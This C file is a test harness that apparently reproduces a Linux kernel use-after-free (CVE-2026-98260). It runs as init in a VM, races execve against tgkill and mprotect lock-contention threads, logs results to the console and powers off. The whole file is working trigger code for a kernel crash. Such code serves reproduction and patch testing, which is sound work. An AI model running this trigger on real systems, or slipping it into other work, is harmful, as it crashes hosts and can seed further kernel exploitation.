/*
 * CVE-2026-98260 A/B harness — runs as init inside an initramfs.
 *
 * Same trigger core as trigger_v3.c (deterministic de_thread() synchronisation
 * with a clone(CLONE_VM) killer plus mprotect lock contention), but it also
 * brings up /dev and /proc and powers the VM off when the loop finishes, so
 * the whole A/B experiment is: boot kernel -> run -> panic or clean poweroff.
 *
 * Result markers printed to the console:
 *   AB_START <n>
 *   AB_NO_PANIC          (loop finished; kernel survived)
 *   AB_PANIC_EXPECTED    (never printed: a UAF here is fatal)
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/mman.h>
#include <sys/reboot.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

#define NVMA 60000
#define STACKSZ (1U << 20)

static volatile int g_tid;
static volatile int g_golock;
static volatile int g_injail;
static volatile int g_stop;
static int g_dry;
static void *g_base;
static size_t g_len;

static int con_fd = 1;

static void say(const char *s) {
    if (con_fd >= 0) {
        ssize_t n = write(con_fd, s, strlen(s));
        (void)n;
    }
}

static int locker_fn(void *arg) {
    (void)arg;
    int prot = PROT_NONE;
    while (!g_golock) {
        if (g_stop) return 0;
        sched_yield();
    }
    while (!g_stop) {
        /* The race target is our parent; once it is gone we are reparented to
         * init, so bail out instead of hammering the mmap lock forever. */
        if (getppid() == 1) return 0;
        g_injail = 1;
        mprotect(g_base, g_len, prot);
        g_injail = 0;
        prot = (prot == PROT_NONE) ? PROT_READ : PROT_NONE;
    }
    return 0;
}

static int killer_fn(void *arg) {
    int tgid = (int)(long)arg;
    int old;

    while (!(old = g_tid)) {
        if (g_stop) return 0;
        sched_yield();
    }
    for (;;) {
        long rc = syscall(SYS_tgkill, tgid, old, 0);
        if (rc < 0 && errno == ESRCH) break;
        if (g_stop) return 0;
        sched_yield();
    }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    return 0;
}

static void *exec_fn(void *arg) {
    struct sigevent ev;
    struct itimerspec spec;
    timer_t t;
    char *const argv[] = { (char *)"ab", (char *)"--exec-ok", NULL };
    (void)arg;

    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_SIGNAL;
    ev.sigev_signo = SIGRTMIN;
    if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &t)) _exit(120);
    memset(&spec, 0, sizeof(spec));
    spec.it_value.tv_sec = 3600;
    if (timer_settime(t, 0, &spec, NULL)) _exit(121);

    g_tid = (int)syscall(SYS_gettid);
    __sync_synchronize();
    g_golock = 1;
    if (g_dry) {                          /* dry: set up, never exec/race */
        usleep(20000);
        _exit(0);
    }
    while (!g_injail) sched_yield();
    execve("/proc/self/exe", argv, (char *const[]){ NULL });
    _exit(122);
}

static int spawn_sharing(int (*fn)(void *), void *arg) {
    void *stack = mmap(NULL, STACKSZ, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
    if (stack == MAP_FAILED) return -1;
    int pid = clone(fn, (char *)stack + STACKSZ, CLONE_VM | SIGCHLD, arg);
    if (pid < 0) munmap(stack, STACKSZ);
    return pid;
}

static int prepare_vmas(int nvma) {
    long page = sysconf(_SC_PAGESIZE);
    int fd = (int)syscall(SYS_memfd_create, "ballast", MFD_CLOEXEC);
    if (fd < 0 || ftruncate(fd, page)) return -1;
    g_len = (size_t)nvma * (size_t)page;
    g_base = mmap(NULL, g_len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_base == MAP_FAILED) { close(fd); return -1; }
    for (int i = 0; i < nvma; i++) {
        void *at = (char *)g_base + (size_t)i * (size_t)page;
        if (mmap(at, (size_t)page, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != at) {
            close(fd);
            return -1;
        }
    }
    close(fd);
    return 0;
}

static void child_race(int nvma, int nlocker) {
    pthread_t th;
    sigset_t blk;

    if (prepare_vmas(nvma)) _exit(110);
    for (int i = 0; i < nlocker; i++)
        if (spawn_sharing(locker_fn, NULL) < 0) _exit(111);
    if (!g_dry && spawn_sharing(killer_fn, (void *)(long)getpid()) < 0) _exit(112);

    sigemptyset(&blk);
    sigaddset(&blk, SIGRTMIN);
    pthread_sigmask(SIG_BLOCK, &blk, NULL);

    if (pthread_create(&th, NULL, exec_fn, NULL)) _exit(113);
    for (;;) sched_yield();
}

static void setup_rootfs(void) {
    mkdir("/dev", 0755);
    mkdir("/proc", 0755);
    mount("devtmpfs", "/dev", "devtmpfs", 0, "");
    mount("proc", "/proc", "proc", 0, "");
    int fd = open("/dev/console", O_WRONLY);
    if (fd >= 0) con_fd = fd;
}

int main(int argc, char **argv) {
    int iters = 40, nvma = NVMA, nlocker = 48;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--exec-ok")) return 0;
        else if (!strcmp(argv[i], "--iters") && i + 1 < argc) iters = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--nvma") && i + 1 < argc) nvma = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--lockers") && i + 1 < argc) nlocker = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--dry")) g_dry = 1;
    }

    if (getpid() == 1) {
        setup_rootfs();
        /* allow "ab_iters=N" on the kernel cmdline when running as init */
        int fd = open("/proc/cmdline", O_RDONLY);
        if (fd >= 0) {
            char buf[512];
            ssize_t n = read(fd, buf, sizeof(buf) - 1);
            close(fd);
            if (n > 0) {
                buf[n] = 0;
                char *p = strstr(buf, "ab_iters=");
                if (p) iters = atoi(p + 9);
                p = strstr(buf, "ab_lockers=");
                if (p) nlocker = atoi(p + 11);
                p = strstr(buf, "ab_nvma=");
                if (p) nvma = atoi(p + 8);
            }
        }
    }

    char line[96];
    snprintf(line, sizeof(line), "AB_START iters=%d nvma=%d lockers=%d\n",
             iters, nvma, nlocker);
    say(line);

    for (int it = 0; it < iters; it++) {
        pid_t pid = fork();
        if (pid == 0) child_race(nvma, nlocker);
        if (pid < 0) break;

        int st = 0, waited = 0;
        while (waited < 3000) {
            pid_t r = waitpid(pid, &st, WNOHANG);
            if (r == pid) break;
            usleep(1000);
            waited++;
        }
        if (waited >= 3000) { kill(pid, SIGKILL); waitpid(pid, &st, 0); }
        snprintf(line, sizeof(line), "AB_ITER %d %s\n", it + 1,
                 (WIFEXITED(st) && WEXITSTATUS(st) == 0) ? "exec_ok" :
                 (WIFEXITED(st) && WEXITSTATUS(st) == 122) ? "WINDOW" :
                 (WIFSIGNALED(st) && WTERMSIG(st) == SIGKILL) ? "killed" : "other");
        say(line);
    }

    say("AB_NO_PANIC\n");
    sync();
    if (getpid() == 1) {
        reboot(RB_POWER_OFF);
        for (;;) pause();
    }
    return 0;
}
